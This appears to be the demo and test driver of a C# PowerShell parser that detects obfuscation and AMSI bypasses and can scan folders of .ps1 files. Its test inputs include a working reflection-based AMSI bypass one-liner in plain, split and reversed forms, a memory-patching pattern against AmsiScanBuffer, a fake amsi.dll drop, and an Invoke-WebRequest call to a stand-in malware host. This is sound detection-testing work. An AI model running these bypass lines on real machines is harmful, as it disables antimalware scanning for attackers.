using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using PSParser;

namespace PSParserDemo;

class Program
{
    static void Main(string[] args)
    {
        // Directory / file scan mode: dotnet run -- <path>
        if (args.Length > 0)
        {
            ScanPath(args[0]);
            return;
        }

        Console.WriteLine("=== PowerShell Parser — Obfuscation & AMSI Bypass Detection ===\n");

        // ── original tests ──────────────────────────────────────────────────
        TestBasicInterpolation();
        TestComplexInterpolation();
        TestBase64Interpolation();
        TestObfuscationDetection();
        TestMultiLayerObfuscation();

        // ── AMSI bypass detection ───────────────────────────────────────────
        Console.WriteLine(new string('═', 60));
        Console.WriteLine("AMSI BYPASS DETECTION TESTS");
        Console.WriteLine(new string('═', 60) + "\n");

        TestAmsiDirect();
        TestAmsiConcatenated();
        TestAmsiReflectionFullSyntax();
        TestAmsiObfuscatedConcat();
        TestAmsiMemoryPatch();
        TestAmsiDllHijack();
        TestAmsiReversedString();
    }

    // ── directory / file scanner ─────────────────────────────────────────────
    static void ScanPath(string path)
    {
        string[] files = Directory.Exists(path)
            ? Directory.GetFiles(path, "*.ps1", SearchOption.AllDirectories)
            : [path];

        Console.WriteLine($"Scanning {files.Length} file(s) in: {path}\n");
        Console.WriteLine($"{"File",-50} {"Status",-20} {"Conf",5}  Indicators");
        Console.WriteLine(new string('─', 110));

        foreach (var file in files.OrderBy(f => f))
        {
            try
            {
                var source   = File.ReadAllText(file);
                var detector = Analyze(source);
                var report   = detector.Report;
                var name     = Path.GetFileName(file);
                var status   = report.IsAmsiBypass ? "AMSI BYPASS" :
                               report.Indicators.Count > 0  ? "Suspicious"  : "Clean";
                var conf     = report.ConfidenceScore;

                Console.WriteLine($"{name,-50} {status,-20} {conf,5}  {SummarizeIndicators(report)}");
            }
            catch (Exception ex)
            {
                Console.WriteLine($"{Path.GetFileName(file),-50} {"ERROR",-20}        {ex.Message[..Math.Min(60, ex.Message.Length)]}");
            }
        }

        Console.WriteLine(new string('─', 110));
        Console.WriteLine("\nDetailed findings:\n");

        foreach (var file in files.OrderBy(f => f))
        {
            try
            {
                var source   = File.ReadAllText(file);
                var detector = Analyze(source);
                if (detector.Report.Indicators.Count == 0) continue;

                Console.WriteLine($"── {Path.GetFileName(file)} ──");
                foreach (var ind in detector.Report.Indicators)
                    Console.WriteLine($"  [{ind.Severity}] {ind.Type}: {ind.Description}");
                Console.WriteLine();
            }
            catch { }
        }
    }

    static string SummarizeIndicators(AmsiBypassReport r) =>
        r.Indicators.Count == 0
            ? "—"
            : string.Join(", ", r.Indicators
                .GroupBy(i => i.Type)
                .Select(g => $"{g.Key}({g.Count()})"));

    // ── helper: run both raw-scan and AST walk on the same code ─────────────
    static AmsiBypassDetector Analyze(string code)
    {
        var detector = new AmsiBypassDetector();
        detector.ScanSource(code);          // raw scan — always works

        try
        {
            var ast = PSParser.PSParser.FromSource(code).Parse();
            ast.Accept(detector);           // AST walk — adds depth for parseable code
        }
        catch { /* unsupported syntax is handled by ScanSource */ }

        return detector;
    }

    // ────────────────────────────────────────────────────────────────────────
    // AMSI tests
    // ────────────────────────────────────────────────────────────────────────

    static void TestAmsiDirect()
    {
        Console.WriteLine("AMSI-1: Direct string — LoadLibrary(\"amsi.dll\")");
        Console.WriteLine(new string('-', 50));

        string code = @"LoadLibrary(""amsi.dll"")";
        Console.WriteLine($"Input : {code}\n");

        Console.Write(Analyze(code).Report);
    }

    static void TestAmsiConcatenated()
    {
        Console.WriteLine("AMSI-2: Concatenated AmsiScanBuffer detection");
        Console.WriteLine(new string('-', 50));

        // GetProcAddress with the function name split across literals
        string code = @"GetProcAddress($lib, ""AmsiScan"" + ""Buffer"")";
        Console.WriteLine($"Input : {code}\n");

        Console.Write(Analyze(code).Report);
    }

    static void TestAmsiReflectionFullSyntax()
    {
        Console.WriteLine("AMSI-3: Matt Graeber reflection bypass (full PS syntax)");
        Console.WriteLine(new string('-', 50));

        // Real bypass — parser won't handle [Ref].Assembly... syntax,
        // but ScanSource finds AmsiUtils and amsiInitFailed.
        string code =
            "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')" +
            ".GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)";
        Console.WriteLine($"Input : {code}\n");

        Console.Write(Analyze(code).Report);
    }

    static void TestAmsiObfuscatedConcat()
    {
        Console.WriteLine("AMSI-4: Obfuscated concatenation (WMF5 autologging bypass variant)");
        Console.WriteLine(new string('-', 50));

        // amsiInitFailed and AmsiUtils split across + concat to evade simple grep
        string code =
            "[Ref].Assembly.GetType('System.Management.Automation.' + 'Amsi' + 'Utils')" +
            ".GetField('amsiInit' + 'Failed', 'NonPublic,Static').SetValue($null, $true)";
        Console.WriteLine($"Input : {code}\n");

        Console.Write(Analyze(code).Report);
    }

    static void TestAmsiMemoryPatch()
    {
        Console.WriteLine("AMSI-5: Memory patching (C# P/Invoke style)");
        Console.WriteLine(new string('-', 50));

        // Pattern from AmsiBypass.cs — load amsi.dll, get AmsiScanBuffer, patch memory
        string code = @"
LoadLibrary(""amsi.dll"")
GetProcAddress($lib, ""AmsiScanBuffer"")
VirtualProtect($asb, 6, 0x40, $old)
";
        Console.WriteLine($"Input : {code.Trim()}\n");

        Console.Write(Analyze(code).Report);
    }

    static void TestAmsiDllHijack()
    {
        Console.WriteLine("AMSI-6: DLL hijack — writing fake amsi.dll to disk");
        Console.WriteLine(new string('-', 50));

        // Nishang dllhijack method writes a fake amsi.dll next to powershell.exe
        string code = @"[System.IO.File]::WriteAllBytes(""$pwd\amsi.dll"", $dllBytes)";
        Console.WriteLine($"Input : {code}\n");

        Console.Write(Analyze(code).Report);
    }

    static void TestAmsiReversedString()
    {
        Console.WriteLine("AMSI-7: Reversed-string obfuscation (unloadobfuscated variant)");
        Console.WriteLine(new string('-', 50));

        // The actual nishang technique reverses the payload so naive string search misses it.
        // We reverse it back and check.
        string payload = "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)";
        string reversed = new([.. payload.Reverse()]);
        string code = $"Invoke-Expression \"{reversed}\"";
        Console.WriteLine($"Input : [reversed AmsiUtils bypass payload]\n");

        Console.Write(Analyze(code).Report);
    }

    // ────────────────────────────────────────────────────────────────────────
    // Original obfuscation tests (unchanged)
    // ────────────────────────────────────────────────────────────────────────

    static void TestBasicInterpolation()
    {
        Console.WriteLine("Test 1: Basic String Interpolation");
        Console.WriteLine("==================================\n");

        string code = @"""Hello $name, you are $age years old""";
        Console.WriteLine($"Input: {code}\n");

        var parser = PSParser.PSParser.FromSource(code);
        var ast = parser.Parse();

        var detector = new ObfuscationDetector();
        ast.Accept(detector);

        Console.WriteLine($"Suspicion Score: {detector.Report.SuspicionScore:F2}/10");
        Console.WriteLine($"Indicators: {detector.Report.Indicators.Count}\n");
    }

    static void TestComplexInterpolation()
    {
        Console.WriteLine("Test 2: Complex String Interpolation");
        Console.WriteLine("===================================\n");

        string code = @"""The result is: $(Get-Process | Select-Object Name)""";
        Console.WriteLine($"Input: {code}\n");

        var parser = PSParser.PSParser.FromSource(code);
        var ast = parser.Parse();

        Console.WriteLine("AST Parsed successfully\n");
    }

    static void TestBase64Interpolation()
    {
        Console.WriteLine("Test 3: Base64 in String Interpolation");
        Console.WriteLine("====================================\n");

        string base64IEX = Convert.ToBase64String(System.Text.Encoding.UTF8.GetBytes("IEX"));

        string code = $@"""${{base64}} | Invoke-Expression""";
        Console.WriteLine($"Input: {code}");
        Console.WriteLine($"Base64 segment: {base64IEX}\n");

        var evaluator = new StringEvaluator();
        evaluator.SetVariable("base64", base64IEX);

        string decoded = evaluator.TryDecodeBase64(base64IEX);
        Console.WriteLine($"Decoded: {decoded}\n");
    }

    static void TestObfuscationDetection()
    {
        Console.WriteLine("Test 4: Obfuscation Detection");
        Console.WriteLine("==========================\n");

        string code = @"IEX (""c""+""md"" + "".exe"")";
        Console.WriteLine($"Input: {code}\n");

        var parser = PSParser.PSParser.FromSource(code);
        var ast = parser.Parse();

        var detector = new ObfuscationDetector();
        ast.Accept(detector);

        Console.WriteLine(detector.Report.ToString());
    }

    static void TestMultiLayerObfuscation()
    {
        Console.WriteLine("Test 5: Multi-Layer Obfuscation");
        Console.WriteLine("==============================\n");

        string layer1 = "Invoke-WebRequest https://malware.com";
        string layer2Base64 = Convert.ToBase64String(System.Text.Encoding.UTF8.GetBytes(layer1));
        string layer3Base64 = Convert.ToBase64String(System.Text.Encoding.UTF8.GetBytes(layer2Base64));

        Console.WriteLine($"Original: {layer1}");
        Console.WriteLine($"Layer 2 (Base64): {layer2Base64}");
        Console.WriteLine($"Layer 3 (Base64 of Base64): {layer3Base64}\n");

        var evaluator = new StringEvaluator();
        var deobfuscated = evaluator.DeobfuscateNestedEncoding(layer3Base64);

        Console.WriteLine("Deobfuscation Layers:");
        for (int i = 0; i < deobfuscated.Count; i++)
            Console.WriteLine($"  Layer {i}: {deobfuscated[i][..Math.Min(50, deobfuscated[i].Length)]}...");

        Console.WriteLine();
    }
}
